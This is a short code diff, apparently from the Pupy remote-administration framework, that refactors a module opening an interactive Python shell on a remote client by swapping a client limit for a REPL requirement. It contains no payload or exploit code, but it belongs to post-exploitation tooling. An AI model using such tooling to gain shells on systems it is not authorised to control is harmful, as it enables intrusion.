@@ -22,8 +22,9 @@ def enqueue_output(out, queue):
 @config(cat="admin")
 class InteractivePythonShell(PupyModule):
     """ open an interactive python shell on the remote client """
-    max_clients=1
-    dependencies=['pyshell']
+
+    io = REQUIRE_REPL
+    dependencies = ['pyshell']
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='pyshell', description=self.__doc__)
